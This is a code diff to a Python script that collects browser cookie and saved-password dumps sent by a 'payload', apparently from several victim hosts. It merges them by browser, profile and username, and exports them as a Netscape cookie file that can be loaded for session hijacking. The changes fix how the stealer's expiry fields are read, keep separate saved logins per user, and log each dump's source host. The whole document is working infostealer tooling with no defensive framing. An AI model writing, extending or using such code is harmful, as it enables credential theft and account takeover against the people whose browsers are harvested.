@@ -86,6 +86,14 @@ def serve():
         CloseHandle(h)
 
 
+def expiry(c):
+    """The payload writes expirationDate; cookielog.py writes expires."""
+    try:
+        return int(c.get("expirationDate") or c.get("expires") or 0)
+    except (TypeError, ValueError):
+        return 0
+
+
 def merge(new):
     old = []
     if os.path.exists(JSONF):
@@ -94,13 +102,17 @@ def merge(new):
         except Exception: pass
     seen, out = {}, []
     for c in old + list(new):
-        if not c.get("name"): continue
-        # key without value: cookies with the same name/path but a different value keep the most recent one
-        k = (c.get("browser"), c.get("profile"), c.get("domain"), c["name"], c.get("path"))
+        if not isinstance(c, dict) or not c.get("name") or not c.get("domain"): continue
+        # identity includes browser/profile/_username: without them every
+        # saved login of a domain (all name="password") collapsed into one and
+        # cross-profile cookies overwrote each other
+        k = (c.get("_host"), c.get("browser"), c.get("profile"), c.get("domain"),
+             c["name"], c.get("path"), c.get("_username"),
+             c.get("value") if c["name"] == "token" else None)
         if k not in seen:
             seen[k] = len(out); out.append(c)
         else:
-            out[seen[k]] = c   # overwrites with the most recent version
+            out[seen[k]] = c   # most recent value wins
     return out
 
 
@@ -111,10 +123,11 @@ def write_txt(rows):
     except Exception:
         l = []
         for c in rows:
-            d = c["domain"] if c["domain"].startswith(".") else "." + c["domain"]
-            l.append("\t".join([d, "TRUE", c.get("path") or "/",
+            dom = (c.get("domain") or "").lstrip(".")
+            if not dom: continue
+            l.append("\t".join(["." + dom, "TRUE", c.get("path") or "/",
                                 "TRUE" if c.get("secure") else "FALSE",
-                                str(int(c.get("expires") or 0)), c["name"], c.get("value") or ""]))
+                                str(expiry(c)), c["name"], c.get("value") or ""]))
         body = "# Netscape HTTP Cookie File\n" + "\n".join(l) + "\n"
     with open(TXT, "w", encoding="utf-8") as f: f.write(body)
 
@@ -127,14 +140,20 @@ def main():
         except Exception as ex:
             print(f"[-] unreadable JSON ({len(raw)} bytes): {ex}"); continue
         rows = obj.get("cookies", obj) if isinstance(obj, dict) else obj
+        if not isinstance(rows, list):
+            print("[-] payload sent a non-list payload (%s)" % type(rows).__name__); continue
+        rows = [c for c in rows if isinstance(c, dict) and c.get("name") and c.get("domain")]
+        if not rows:
+            print("[-] dump had no usable cookie records"); continue
         alls = merge(rows)
         with open(JSONF, "w", encoding="utf-8") as f:
             json.dump(alls, f, ensure_ascii=False, indent=1)
         write_txt(alls)
         top = {}
-        for c in rows: top[c.get("domain", "?")] = top.get(c.get("domain", "?"), 0) + 1
-        s = sum(1 for c in rows if not int(c.get("expires") or 0))
-        print(f"[+] {len(rows)} cookies in this dump ({s} session) | total: {len(alls)} -> {TXT}")
+        for c in rows: top[c.get("domain") or "?"] = top.get(c.get("domain") or "?", 0) + 1
+        s = sum(1 for c in rows if not expiry(c))
+        host = next((c.get("_host") for c in rows if c.get("_host")), "local pipe")
+        print(f"[+] {len(rows)} cookies from {host} ({s} session) | total: {len(alls)} -> {TXT}")
         for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:12]: print(f"    {n:5d}  {d}")
 
 main()
